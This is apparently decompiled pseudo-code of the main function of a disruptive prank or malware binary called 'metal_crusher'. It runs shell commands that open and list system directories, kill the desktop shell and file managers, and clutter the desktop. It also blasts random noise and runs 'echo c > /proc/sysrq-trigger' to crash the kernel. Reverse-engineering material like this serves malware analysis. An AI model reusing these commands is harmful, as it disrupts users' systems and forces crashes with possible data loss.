
  fn metal_crusher::main::h9727646a2bcbc8e1() -> i64

{
    let mut var_268: i128;
    std::env::args::h94b742ddbe085465(&var_268);
    let mut var_148: ();
    core::iter::traits::iterator::Iterator::collect::h72b4ec0362567ca5(&var_148, &var_268);
    _$LT$T$u20$as$u20$alloc..slice..$LT$impl$u20$$u5b$T$u5d$$GT$..to_vec_in..ConvertVec$GT$::to_vec::hc831021ef339ddb2(&var_268);
    let var_258: i64;
    let var_1e8: i64 = var_258;
    let mut var_1f8: i128 = var_268;
    let mut var_f8: i32;
    core::result::Result$LT$T$C$E$GT$::unwrap::h55000a11ecaa97f2(&var_f8, &var_1f8);
    let var_140: i64;
    let var_138: i64;
    
    if _$LT$T$u20$as$u20$core..slice..cmp..SliceContains$GT$::slice_contains::hf85221c3aca31123(
        &var_f8, var_140, var_138) == 0
    {
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha04b33545db7d743(&var_f8);
        let var_1a8_1: i64 = -0x8000000000000000;
        let mut var_1b8: i64 = 0;
        let var_190_1: i8 = 0;
        let var_198: i64;
        let var_248_1: i64 = var_198;
        let mut var_240_1: i8 = 0;
        let var_18f: i32;
        let var_23f_1: i32 = var_18f;
        let var_18b: i16;
        let var_23b_1: i16 = var_18b;
        let var_189: i8;
        let var_239_1: i8 = var_189;
        let var_258_1: i64 = var_1a8_1;
        let var_1a0: i64;
        let var_250_1: i64 = var_1a0;
        var_268 = var_1b8;
        std::thread::Builder::spawn_unchecked::h1ce4ae56c7065926(&var_1f8, &var_268);
        core::result::Result$LT$T$C$E$GT$::expect::h0f618ee5425b50ac(&var_268, &var_1f8);
        core::ptr::drop_in_place$LT$std..thread..JoinHandle$LT$$LP$$RP$$GT$$GT$::ha4837b2075f310b9(
            &var_268);
        metal_crusher::music::play_audio::h7324776fa7dd087f();
        metal_crusher::fun::notify::hb8b2a52834cecaca();
        std::thread::sleep::h8814a255f2a81ecc(1, 0);
        metal_crusher::fun::notify::hb8b2a52834cecaca();
        std::thread::sleep::h8814a255f2a81ecc(0, 0x17d78400);
        let mut rax_8: *mut i8;
        let mut rdx_3: i64;
        rax_8 = metal_crusher::fun::detect_terminal::hbf6d36db98f6afb5();
        let mut var_208: *mut i8 = rax_8;
        let var_200_1: i64 = rdx_3;
        std::thread::sleep::h8814a255f2a81ecc(2, 0x11e1a300);
        let mut r12: i64;
        r12 = 1;
        let mut var_258_9: *const i8;
        let mut var_248_7: *const i8;
        
        loop
        {
            var_268 = "xdg-open /xdg-open /binxdg-open …";
            *var_268[8] = 0xa;
            let var_258_2: *const i8 = "xdg-open /binxdg-open /libxdg-op…";
            let var_250_2: i64 = 0xd;
            let var_248_2: *const i8 = "xdg-open /libxdg-open /homexdg-o…";
            var_240_1 = 0xd;
            let var_238_1: *const i8 = "xdg-open /homexdg-open /tmpls /t…";
            let var_230_1: i64 = 0xe;
            let var_228_1: *const i8 = "xdg-open /tmpls /tmp; sleep 2000…";
            let var_220_1: i64 = 0xd;
            let var_218_1: i64 = 0;
            let var_210_1: i64 = 5;
            
            loop
            {
                let mut rax_9: i64;
                let mut rdx_4: i64;
                rax_9 = _$LT$core..array..iter..IntoIter$LT$T$C$_$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h5fe64c1c96c56c1e(&var_268);
                
                if rax_9 == 0
                {
                    break;
                }
                
                metal_crusher::fun::execute_shell::h41804e4a8d918ef1(rax_9);
                std::thread::sleep::h8814a255f2a81ecc(0, 0x23c34600);
            }
            
            core::ptr::drop_in_place$LT$core..array..iter..IntoIter$LT$$RF$str$C$5_usize$GT$$GT$::hee509b89839ede61();
            var_268 = "ls /; sleep 2000";
            *var_268[8] = 0x10;
            let var_258_3: *const i8 = "ls /tmp; sleep 2000ls /bin; slee…";
            let var_250_3: i64 = 0x13;
            let var_248_3: *const i8 = "ls /bin; sleep 2000ls /usr; slee…";
            var_240_1 = 0x13;
            let var_238_2: *const i8 = "ls /usr; sleep 2000ls /etc; slee…";
            let var_230_2: i64 = 0x13;
            let var_228_2: *const i8 = "ls /etc; sleep 2000xdg-open /dev…";
            let var_220_2: i64 = 0x13;
            let var_218_2: i64 = 0;
            let var_210_2: i64 = 5;
            
            loop
            {
                let mut rax_10: i64;
                let mut rdx_5: i64;
                rax_10 = _$LT$core..array..iter..IntoIter$LT$T$C$_$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h5fe64c1c96c56c1e(&var_268);
                
                if rax_10 == 0
                {
                    break;
                }
                
                metal_crusher::fun::run_in_terminal::hb55afbf220dc8f24(var_208);
                std::thread::sleep::h8814a255f2a81ecc(0, 0x23c34600);
            }
            
            core::ptr::drop_in_place$LT$core..array..iter..IntoIter$LT$$RF$str$C$5_usize$GT$$GT$::hee509b89839ede61();
            metal_crusher::fun::destroy_gui_shell::h1e3240fbf7d5db6f();
            metal_crusher::fun::destroy_file_managers::h119efdf6252da426();
            var_1f8 = &var_208;
            *var_1f8[8] = _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::h0847ff0da4c1d6d7;
            var_268 = &data_997680;
            *var_268[8] = 1;
            let var_248_4: i64 = 0;
            let var_258_4: *mut i128 = &var_1f8;
            let var_250_4: i64 = 1;
            let mut var_c8: i128;
            core::option::Option$LT$T$GT$::map_or_else::h1648c532ac184ddc(&var_c8, &var_268);
            var_268 = var_c8;
            let var_b8: i64;
            let var_258_5: i64 = var_b8;
            metal_crusher::fun::execute_shell::h41804e4a8d918ef1(*var_268[8]);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha04b33545db7d743(&var_268);
            std::thread::sleep::h8814a255f2a81ecc(1, 0xbebc200);
            metal_crusher::fun::reanimate_gui_shell::h0e56d731a5a95ba2();
            var_268 = "xdg-open /devxdg-open /sbinxdg-o…";
            *var_268[8] = 0xd;
            let var_258_6: *const i8 = "xdg-open /sbinxdg-open /runxdg-o…";
            let var_250_5: i64 = 0xe;
            let var_248_5: *const i8 = "xdg-open /runxdg-open /sysxdg-op…";
            var_240_1 = 0xd;
            let var_238_3: *const i8 = "xdg-open /sysxdg-open /proctree …";
            let var_230_3: i64 = 0xd;
            let var_228_3: *const i8 = "xdg-open /proctree /home; sleep …";
            let var_220_3: i64 = 0xe;
            let var_218_3: i64 = 0;
            let var_210_3: i64 = 5;
            
            loop
            {
                let mut rax_11: i64;
                let mut rdx_7: i64;
                rax_11 = _$LT$core..array..iter..IntoIter$LT$T$C$_$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h5fe64c1c96c56c1e(&var_268);
                
                if rax_11 == 0
                {
                    break;
                }
                
                metal_crusher::fun::execute_shell::h41804e4a8d918ef1(rax_11);
                std::thread::sleep::h8814a255f2a81ecc(0, 0x23c34600);
            }
            
            core::ptr::drop_in_place$LT$core..array..iter..IntoIter$LT$$RF$str$C$5_usize$GT$$GT$::hee509b89839ede61();
            metal_crusher::fun::run_in_terminal::hb55afbf220dc8f24(var_208);
            std::thread::sleep::h8814a255f2a81ecc(0, 0x23c34600);
            let mut rbx_1: i32 = 4;
            
            loop
            {
                let temp0_1: i32 = rbx_1;
                rbx_1 -= 1;
                
                if temp0_1 == 1
                {
                    break;
                }
                
                metal_crusher::fun::run_in_terminal::hb55afbf220dc8f24(var_208);
                std::thread::sleep::h8814a255f2a81ecc(0, 0x23c34600);
            }
            
            var_1f8 = &var_208;
            *var_1f8[8] = _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::h0847ff0da4c1d6d7;
            var_268 = &data_997680;
            *var_268[8] = 1;
            let var_248_6: i64 = 0;
            let var_258_7: *mut i128 = &var_1f8;
            let var_250_6: i64 = 1;
            let mut var_b0: i128;
            core::option::Option$LT$T$GT$::map_or_else::h1648c532ac184ddc(&var_b0, &var_268);
            var_268 = var_b0;
            let var_a0: i64;
            let var_258_8: i64 = var_a0;
            metal_crusher::fun::execute_shell::h41804e4a8d918ef1(*var_268[8]);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha04b33545db7d743(&var_268);
            std::thread::sleep::h8814a255f2a81ecc(1, 0xbebc200);
            metal_crusher::fun::destroy_file_managers::h119efdf6252da426();
            std::thread::sleep::h8814a255f2a81ecc(2, 0);
            metal_crusher::fun::toggle_desktop_overview::h76fcc1b69c9cf37e();
            metal_crusher::fun::put_random_shit_on_desktop::h71399300085ae3fd();
            metal_crusher::fun::toggle_desktop_overview::h76fcc1b69c9cf37e();
            var_268 = "xdg-open https://www.youtube.com…";
            *var_268[8] = 0x28;
            var_258_9 = "xdg-open https://www.google.com/…";
            let var_250_7: i64 = 0x2e;
            var_248_7 = "xdg-open https://2ip.ioxdg-open …";
            var_240_1 = 0x17;
            let var_238_4: *const i8 = "xdg-open https://github.com/rela…";
            let var_230_4: i64 = 0x38;
            let var_228_4: *const i8 = "xdg-open https://www.newgrounds.…";
            let var_220_4: i64 = 0x38;
            let var_218_4: i64 = 0;
            let var_210_4: i64 = 5;
            
            loop
            {
                let mut rax_12: i64;
                let mut rdx_10: i64;
                rax_12 = _$LT$core..array..iter..IntoIter$LT$T$C$_$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h5fe64c1c96c56c1e(&var_268);
                
                if rax_12 == 0
                {
                    break;
                }
                
                metal_crusher::fun::execute_shell::h41804e4a8d918ef1(rax_12);
                metal_crusher::fun::execute_shell::h41804e4a8d918ef1(1);
                std::thread::sleep::h8814a255f2a81ecc(1, 0x1dcd6500);
            }
            
            core::ptr::drop_in_place$LT$core..array..iter..IntoIter$LT$$RF$str$C$5_usize$GT$$GT$::hee509b89839ede61();
            std::thread::sleep::h8814a255f2a81ecc(0, 0x1dcd6500);
            let mut rbx_2: i32 = 8;
            
            loop
            {
                let temp1_1: i32 = rbx_2;
                rbx_2 -= 1;
                
                if temp1_1 == 1
                {
                    break;
                }
                
                std::thread::sleep::h8814a255f2a81ecc(0, 0xbebc200);
                metal_crusher::fun::toggle_desktop_overview::h76fcc1b69c9cf37e();
            }
            
            if (r12 & 1) == 0
            {
                break;
            }
            
            r12 = 0;
            std::thread::sleep::h8814a255f2a81ecc(3, 0x1dcd6500);
        }
        
        std::env::var::hfb15700640056880(&var_268, &data_43010c[8]);
        let mut var_98: ();
        core::result::Result$LT$T$C$E$GT$::unwrap::hf281b12ef98186e8(&var_98, &var_268);
        var_248_7 = var_198;
        var_258_9 = var_1a8_1;
        var_268 = var_1b8;
        std::thread::Builder::spawn_unchecked::ha2ddb01914461b9d(&var_1f8, &var_268);
        core::result::Result$LT$T$C$E$GT$::expect::h0f618ee5425b50ac(&var_268, &var_1f8);
        core::ptr::drop_in_place$LT$std..thread..JoinHandle$LT$$LP$$RP$$GT$$GT$::ha4837b2075f310b9(
            &var_268);
        std::thread::Builder::spawn_unchecked::heb2ac1b7f718bfa5(&var_268, &var_1b8);
        core::result::Result$LT$T$C$E$GT$::expect::h0f618ee5425b50ac(&var_1f8, &var_268);
        core::ptr::drop_in_place$LT$std..thread..JoinHandle$LT$$LP$$RP$$GT$$GT$::ha4837b2075f310b9(
            &var_1f8);
        var_1f8 = &var_98;
        *var_1f8[8] =
            _$LT$alloc..string..String$u20$as$u20$core..fmt..Display$GT$::fmt::h93175f2dbdefd6b2;
        var_268 = &data_997690;
        *var_268[8] = 1;
        let var_248_8: i64 = 0;
        let var_258_10: *mut i128 = &var_1f8;
        let var_250_8: i64 = 1;
        let mut var_48: ();
        core::option::Option$LT$T$GT$::map_or_else::h1648c532ac184ddc(&var_48, &var_268);
        std::fs::read_dir::h89149955dc944fa3(&var_268, &var_48);
        let mut rax_13: i64;
        let mut rdx_13: i8;
        rax_13 = core::result::Result$LT$T$C$E$GT$::unwrap::hb31effbf8bc15b97(var_268, *var_268[8]);
        let mut var_1c8: i64 = rax_13;
        let var_1c0_1: i8 = rdx_13 & 1;
        
        loop
        {
            _$LT$std..fs..ReadDir$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h4e712d0990114342(&var_f8, &var_1c8);
            
            if var_f8 != 1
            {
                break;
            }
            
            let mut var_120: ();
            let mut var_f0: ();
            core::result::Result$LT$T$C$E$GT$::unwrap::h490d13a838f57c0c(&var_120, &var_f0);
            std::fs::DirEntry::file_type::hefeddcb43cb060f5(&var_268, &var_120);
            
            if (core::result::Result$LT$T$C$E$GT$::unwrap::h5c47582f0e8716ec(&var_268) & 0xf000)
                == 0x4000
            {
                std::fs::DirEntry::path::hab67f89e376a9076(&var_1f8, &var_120);
                let mut var_160: i128 = var_1f8;
                let mut var_188: *mut i128 = &var_160;
                let var_180_1: fn(arg1: *mut i64, arg2: i64) -> u64 = _$LT$std..path..Display$u20$as$u20$core..fmt..Display$GT$::fmt::h20adf00188ba8439;
                var_268 = &data_9976a0;
                *var_268[8] = 1;
                let var_248_9: i64 = 0;
                let var_258_11: *mut *mut i128 = &var_188;
                let var_250_9: i64 = 1;
                let mut var_80: i128;
                core::option::Option$LT$T$GT$::map_or_else::h1648c532ac184ddc(&var_80, &var_268);
                core::ptr::drop_in_place$LT$std..path..PathBuf$GT$::h3d4a59f8b713a426(&var_1f8);
                var_268 = var_80;
                let var_70: i64;
                let var_258_12: i64 = var_70;
                metal_crusher::fun::execute_shell::h41804e4a8d918ef1(*var_268[8]);
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha04b33545db7d743(&var_268);
                std::fs::DirEntry::path::hab67f89e376a9076(&var_268, &var_120);
                std::fs::read_dir::hf78a92d2a9764b00(&var_1f8, &var_268);
                let mut rax_16: i64;
                let mut rdx_15: i8;
                rax_16 = core::result::Result$LT$T$C$E$GT$::unwrap::hb31effbf8bc15b97(var_1f8, 
                    *var_1f8[8]);
                let mut var_170: i64 = rax_16;
                let var_168_1: i8 = rdx_15 & 1;
                
                loop
                {
                    _$LT$std..fs..ReadDir$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h4e712d0990114342(&var_1f8, &var_170);
                    
                    if var_1f8 != 1
                    {
                        break;
                    }
                    
                    core::result::Result$LT$T$C$E$GT$::unwrap::h490d13a838f57c0c(&var_80, 
                        &*var_1f8[8]);
                    std::fs::DirEntry::file_type::hefeddcb43cb060f5(&var_268, &var_80);
                    
                    if (core::result::Result$LT$T$C$E$GT$::unwrap::h5c47582f0e8716ec(&var_268)
                        & 0xf000) == 0x4000
                    {
                        std::fs::DirEntry::path::hab67f89e376a9076(&var_160, &var_80);
                        let mut var_58: i128 = var_160;
                        let mut var_130: *mut i128 = &var_58;
                        let var_128_1: fn(arg1: *mut i64, arg2: i64) -> u64 = _$LT$std..path..Display$u20$as$u20$core..fmt..Display$GT$::fmt::h20adf00188ba8439;
                        var_268 = &data_9976a0;
                        *var_268[8] = 1;
                        let var_248_10: i64 = 0;
                        let var_258_13: *mut *mut i128 = &var_130;
                        let var_250_10: i64 = 1;
                        core::option::Option$LT$T$GT$::map_or_else::h1648c532ac184ddc(&var_188, 
                            &var_268);
                        core::ptr::drop_in_place$LT$std..path..PathBuf$GT$::h3d4a59f8b713a426(
                            &var_160);
                        var_268 = var_188;
                        let var_178: i64;
                        let var_258_14: i64 = var_178;
                        metal_crusher::fun::execute_shell::h41804e4a8d918ef1(*var_268[8]);
                        core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha04b33545db7d743(
                            &var_268);
                        std::thread::sleep::h8814a255f2a81ecc(0, 0x17d78400);
                        metal_crusher::fun::toggle_desktop_overview::h76fcc1b69c9cf37e();
                    }
                    
                    core::ptr::drop_in_place$LT$std..fs..DirEntry$GT$::h783082bf94872fe1(&var_80);
                }
                
                core::ptr::drop_in_place$LT$std..fs..ReadDir$GT$::h571b6ef1f796f6ca(&var_170);
                metal_crusher::fun::toggle_desktop_overview::h76fcc1b69c9cf37e();
                std::thread::sleep::h8814a255f2a81ecc(0, 0x17d78400);
            }
            
            core::ptr::drop_in_place$LT$std..fs..DirEntry$GT$::h783082bf94872fe1(&var_120);
        }
        
        core::ptr::drop_in_place$LT$std..fs..ReadDir$GT$::h571b6ef1f796f6ca(&var_1c8);
        std::thread::sleep::h8814a255f2a81ecc(0x28, 0);
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha04b33545db7d743(&var_98);
    }
    else
    {
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha04b33545db7d743(&var_f8);
        std::thread::sleep::h8814a255f2a81ecc(0x6c, 0);
        metal_crusher::fun::execute_shell::h41804e4a8d918ef1("cat /dev/urandom | aplayecho c >…");
        std::thread::sleep::h8814a255f2a81ecc(1, 0);
        metal_crusher::fun::execute_shell::h41804e4a8d918ef1("echo c > /proc/sysrq-trigger");
    }
    
    core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$alloc..string..String$GT$$GT$::h42b994d15418b73d(
        &var_148)
}
